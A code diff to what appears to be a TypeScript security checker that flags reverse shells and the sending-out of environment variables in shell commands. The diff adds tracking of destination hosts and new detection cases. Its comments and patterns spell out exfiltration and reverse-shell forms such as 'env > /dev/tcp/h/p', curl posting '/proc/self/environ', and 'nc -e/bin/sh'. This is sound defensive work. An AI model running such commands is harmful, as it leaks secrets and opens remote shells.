@@ -33,8 +33,11 @@ import mvdanSh from 'mvdan-sh';
 import {
   SHELL_INTERPRETERS,
   baseWord,
+  destTokensForBinary,
+  devNetRedirectHost,
   isListOp,
   literalShellPayload,
+  parseDestHost,
   parseShared,
   redirectWords,
   resolveWordLiteral,
@@ -52,6 +55,11 @@ export interface OutboundFinding {
   ruleName: 'block-reverse-shell' | 'review-env-exfil';
   reason: string;
   description: string;
+  /** data.env-exfil only: the hosts the environment is sent to, or null when
+   *  one sender's destination cannot be read (a dynamic or dotless host, a
+   *  sender whose destination argument is unknown). A trusted-host exemption
+   *  needs every one of them. */
+  destinations?: string[] | null;
 }
 
 export interface OutboundAnalysis {
@@ -139,7 +147,10 @@ export function analyzeOutbound(command: string): OutboundAnalysis {
     return hit;
   }
   const findings: OutboundFinding[] = [];
-  const parsed = new OutboundWalk(findings).run(command, 0);
+  const walk = new OutboundWalk(findings);
+  const parsed = walk.run(command, 0);
+  const envOut = findings.find((f) => f.checkId === 'data.env-exfil');
+  if (envOut) envOut.destinations = walk.envDestinations();
   const computed = { parsed, findings };
   if (cache.size >= CACHE_MAX) {
     const oldest = cache.keys().next().value;
@@ -160,6 +171,63 @@ type Node = any;
 /** Resolved argv of a CallExpr; null marks a dynamic word. */
 function wordsOf(call: Node): (string | null)[] {
   return ((call?.Args || []) as Node[]).map((a) => resolveWordLiteral(a));
+}
+
+/** A word's text with each dynamic part (`$$`, `$PPID`, `$(…)`) as `X`, so a
+ *  path shape still reads when its pid is a variable: `/proc/$$/environ`. */
+function wordShape(word: Node): string {
+  const parts: Node[] = word?.Parts || [];
+  let out = '';
+  for (const p of parts) {
+    const t = syntax.NodeType(p);
+    if (t === 'Lit' || t === 'SglQuoted') out += p.Value ?? '';
+    else if (t === 'DblQuoted') out += wordShape(p);
+    else out += 'X';
+  }
+  return out;
+}
+
+/** A word that is a read of some process's environment, `/proc/<pid>/environ`,
+ *  whether the pid is written out or a variable. `@` and `--flag=` prefixes
+ *  (`-d @/proc/self/environ`, `--post-file=…`) are stripped first. */
+function isProcEnviron(word: Node): boolean {
+  return PROC_ENVIRON_RE.test(wordShape(word).replace(/^.*[@=]/, ''));
+}
+
+/** Any argument or redirect of this statement reads `/proc/<pid>/environ`. */
+function readsProcEnviron(stmt: Node): boolean {
+  const args: Node[] = stmt?.Cmd?.Args || [];
+  const redirs: Node[] = (stmt?.Redirs || []).filter((r: Node) => r?.Word);
+  return args.slice(1).some(isProcEnviron) || redirs.some((r) => isProcEnviron(r.Word));
+}
+
+/** A placeholder for a dynamic word, so the destination reader keeps its
+ *  position: it is no host (parseDestHost needs a dot), so it is unknown. */
+const DYNAMIC_WORD = 'dynamic\u0000';
+
+/** The hosts a sender call sends to, or null when they cannot be read. */
+function senderHosts(head: string, args: (string | null)[]): string[] | null {
+  const tokens = destTokensForBinary(
+    head,
+    args.map((w) => (w === null ? DYNAMIC_WORD : w))
+  );
+  const hosts = tokens.map((t) => parseDestHost(t));
+  if (hosts.length === 0 || hosts.some((h) => h === null)) return null;
+  return hosts as string[];
+}
+
+/** The hosts of a statement's `/dev/tcp` redirects, or null when one is dynamic. */
+function socketHosts(stmt: Node): string[] | null {
+  const hosts: string[] = [];
+  for (const r of (stmt?.Redirs || []) as Node[]) {
+    if (!r?.Word) continue;
+    const shape = wordShape(r.Word);
+    if (!DEV_NET_RE.test(shape)) continue;
+    const host = devNetRedirectHost(resolveWordLiteral(r.Word));
+    if (host === null) return null;
+    hosts.push(host);
+  }
+  return hosts.length > 0 ? hosts : null;
 }
 
 /** Multi-call binaries whose first operand is the applet that runs. */
@@ -236,8 +304,11 @@ function netcatRunsProgram(words: (string | null)[], at: number): boolean {
     const eq = w.indexOf('=');
     const long = eq > 0 ? w.slice(0, eq) : w;
     let program: string | null | undefined;
+    // getopt also takes the value attached: `-e/bin/sh`, `-nve/bin/sh`.
+    const attached = /^-[nvzlkuUdDrtCbh46]*[ec](.+)$/.exec(w);
     if (NETCAT_EXEC_LONG.has(long)) program = eq > 0 ? w.slice(eq + 1) : rest[i + 1];
     else if (/^-[a-zA-Z]*[ec]$/.test(w)) program = rest[i + 1];
+    else if (attached) program = attached[1];
     else return false;
     // A Lua script is the program whatever its name.
     if (long === '--lua-exec' && !listening) return true;
@@ -259,8 +330,9 @@ function socatRunsProgram(words: (string | null)[], at: number): boolean {
   return programs.some((p) => isShellProgram(p) || (!listening && isProgramWord(p)));
 }
 
-/** An env dump: what the call prints is the whole environment. */
-function callDumpsEnv(words: (string | null)[], redirs: (string | null)[]): boolean {
+/** An env dump: what the call prints is the whole environment. `procRead`:
+ *  the statement reads `/proc/<pid>/environ` (readsProcEnviron). */
+function callDumpsEnv(words: (string | null)[], procRead: boolean): boolean {
   const name = baseWord(words[0]);
   // `printenv NAME` prints one variable; only a bare `printenv` (`-0` at most)
   // prints the environment.
@@ -278,19 +350,18 @@ function callDumpsEnv(words: (string | null)[], redirs: (string | null)[]): bool
     return true;
   }
   if (name === 'set' && words.length === 1) return true;
-  if ([...words.slice(1), ...redirs].some((w) => w !== null && PROC_ENVIRON_RE.test(w)))
-    return true;
-  return false;
+  return procRead;
 }
 
 /** An env dump behind wrappers too: `sudo printenv`, `nohup env`. */
-function dumpsEnv(words: (string | null)[], redirs: (string | null)[]): boolean {
+function dumpsEnv(words: (string | null)[], stmt: Node): boolean {
+  const procRead = readsProcEnviron(stmt);
   const end = Math.min(headOf(words).at, words.length - 1);
   for (let i = 1; i <= end; i++) {
     const b = baseWord(words[i]);
-    if ((b === 'env' || b === 'printenv') && callDumpsEnv(words.slice(i), redirs)) return true;
+    if ((b === 'env' || b === 'printenv') && callDumpsEnv(words.slice(i), procRead)) return true;
   }
-  return callDumpsEnv(words, redirs);
+  return callDumpsEnv(words, procRead);
 }
 
 /** `export`, `declare -x`, `declare -p`, `typeset` with no names. */
@@ -303,6 +374,8 @@ function declDumpsEnv(decl: Node): boolean {
     if (a?.Name?.Value) return false;
     const w = a?.Value ? resolveWordLiteral(a.Value) : null;
     if (w === null || !w.startsWith('-')) return false;
+    // `declare -f`, `typeset -F`: functions, no variables.
+    if (/^-[a-zA-Z]*[fF]/.test(w)) return false;
   }
   return true;
 }
@@ -314,6 +387,10 @@ class OutboundWalk {
   private envVars = new Set<string>();
   /** File descriptors `exec` opened on a network socket. */
   private netFds = new Set<string>();
+  /** Where each env-exfil sender sends; one unknown destination makes the
+   *  whole set unknown. */
+  private envSinks = new Set<string>();
+  private envSinkUnknown = false;
 
   constructor(private readonly findings: OutboundFinding[]) {}
 
@@ -350,6 +427,19 @@ class OutboundWalk {
 
   private reverseShell(reason: string): void {
     this.found('commands.reverse-shell', reason);
+  }
+
+  /** The environment leaves through a sender with these destinations. Every
+   *  occurrence is recorded, not only the first one `found` reports. */
+  private envOut(reason: string, hosts: string[] | null): void {
+    this.found('data.env-exfil', reason);
+    if (hosts === null) this.envSinkUnknown = true;
+    else for (const h of hosts) this.envSinks.add(h);
+  }
+
+  /** The hosts the environment was sent to, or null when one is unknown. */
+  envDestinations(): string[] | null {
+    return this.envSinkUnknown || this.envSinks.size === 0 ? null : [...this.envSinks];
   }
 
   private visit(n: Node, depth: number): boolean {
@@ -406,21 +496,22 @@ class OutboundWalk {
         }
       }
       if (SENDERS.has(head)) {
-        if (redirs.some((w) => w !== null && PROC_ENVIRON_RE.test(w))) {
-          this.found('data.env-exfil', `${head} reads /proc/…/environ as its input`);
+        const dest = senderHosts(head, words.slice(at + 1));
+        if (((stmt.Redirs || []) as Node[]).some((r) => r?.Word && isProcEnviron(r.Word))) {
+          this.envOut(`${head} reads /proc/…/environ as its input`, dest);
         }
         // `curl -d @- … <<< "$(env)"`, or an expanding heredoc that holds it.
         const stdin = ((stmt.Redirs || []) as Node[]).some(
           (r) => (r?.Word && this.carriesEnv(r.Word)) || (r?.Hdoc && this.carriesEnv(r.Hdoc))
         );
-        if (stdin) this.found('data.env-exfil', `${head} reads an env dump on its input`);
+        if (stdin) this.envOut(`${head} reads an env dump on its input`, dest);
       }
       // `env > /dev/tcp/h/p`, `echo "$(env)" > /dev/tcp/h/p`: the socket is the sender.
       if (
         toSocket &&
-        (dumpsEnv(words, redirs) || ((cmd.Args || []) as Node[]).some((a) => this.carriesEnv(a)))
+        (dumpsEnv(words, stmt) || ((cmd.Args || []) as Node[]).some((a) => this.carriesEnv(a)))
       ) {
-        this.found('data.env-exfil', 'the environment is written to a network socket');
+        this.envOut('the environment is written to a network socket', socketHosts(stmt));
       }
       // A heredoc on a shell's stdin is the script it runs.
       if (depth < MAX_PAYLOAD_DEPTH && SHELLS.has(head) && shellReadsStdin(words, at)) {
@@ -434,7 +525,7 @@ class OutboundWalk {
     }
     if (type === 'DeclClause') {
       if (toSocket && declDumpsEnv(cmd)) {
-        this.found('data.env-exfil', 'the environment is written to a network socket');
+        this.envOut('the environment is written to a network socket', socketHosts(stmt));
       }
       // `export E="$(env)"`, `declare E=$(printenv)`.
       for (const a of (cmd.Args || []) as Node[]) {
@@ -455,13 +546,13 @@ class OutboundWalk {
     }
     if (SENDERS.has(head)) {
       const args: Node[] = call.Args || [];
+      const dest = senderHosts(head, words.slice(at + 1));
       for (let i = at + 1; i < args.length; i++) {
-        const w = words[i];
-        // `@/proc/self/environ`, `--post-file=/proc/self/environ`.
-        if (w !== null && PROC_ENVIRON_RE.test(w.replace(/^.*[@=]/, ''))) {
-          this.found('data.env-exfil', `${head} sends /proc/…/environ`);
+        // `@/proc/self/environ`, `--post-file=/proc/$$/environ`.
+        if (isProcEnviron(args[i])) {
+          this.envOut(`${head} sends /proc/…/environ`, dest);
         } else if (this.carriesEnv(args[i])) {
-          this.found('data.env-exfil', `the output of an env dump is an argument of ${head}`);
+          this.envOut(`the output of an env dump is an argument of ${head}`, dest);
         }
       }
     }
@@ -487,13 +578,18 @@ class OutboundWalk {
     let net = -1;
     let dump = -1;
     let sender = -1;
+    /** Each sending stage's destinations (null: unknown). */
+    const sinks = new Map<number, string[] | null>();
     stages.forEach((st, i) => {
       const c = st?.Cmd;
       const redirs = redirectWords(st);
       const socket = redirs.some((w) => w !== null && DEV_NET_RE.test(w));
       if (socket || this.readsNetFd(st)) net = i;
       // A later stage writing to a socket sends what the pipeline carries.
-      if (socket && i > 0) sender = Math.max(sender, i);
+      if (socket && i > 0) {
+        sender = Math.max(sender, i);
+        sinks.set(i, socketHosts(st));
+      }
       if (!c) return;
       if (syntax.NodeType(c) === 'DeclClause' && declDumpsEnv(c) && dump < 0) dump = i;
       // A loop that runs each line it reads (`while read l; do $l; done`).
@@ -508,14 +604,22 @@ class OutboundWalk {
       if (NET_CLIENTS.has(head)) net = i;
       if (head === 'openssl' && words[at + 1] === 's_client') net = i;
       const carries = ((c.Args || []) as Node[]).some((a) => this.carriesEnv(a));
-      if ((dumpsEnv(words, redirs) || carries) && dump < 0) dump = i;
-      if (SENDERS.has(head) && i > 0) sender = Math.max(sender, i);
+      if ((dumpsEnv(words, st) || carries) && dump < 0) dump = i;
+      if (SENDERS.has(head) && i > 0) {
+        sender = Math.max(sender, i);
+        const dest = senderHosts(head, words.slice(at + 1));
+        const prior = sinks.get(i);
+        // A stage that also writes to a socket sends to both.
+        sinks.set(i, prior === undefined ? dest : prior && dest ? [...prior, ...dest] : null);
+      }
     });
     if (shell >= 0 && net >= 0) {
       this.reverseShell('a shell and a network client are joined in one pipeline');
     }
     if (dump >= 0 && sender > dump) {
-      this.found('data.env-exfil', 'an env dump is piped into a command that sends data out');
+      const after = [...sinks].filter(([i]) => i > dump).map(([, h]) => h);
+      const dest = after.some((h) => h === null) ? null : (after.flat() as string[]);
+      this.envOut('an env dump is piped into a command that sends data out', dest);
     }
   }
 
@@ -560,7 +664,7 @@ class OutboundWalk {
         const t = syntax.NodeType(n);
         if (t === 'Stmt' && n.Cmd && syntax.NodeType(n.Cmd) === 'CallExpr') {
           const words = wordsOf(n.Cmd);
-          if (words.length > 0 && dumpsEnv(words, redirectWords(n))) hit = true;
+          if (words.length > 0 && dumpsEnv(words, n)) hit = true;
         }
         if (t === 'DeclClause' && declDumpsEnv(n)) hit = true;
         return !hit;
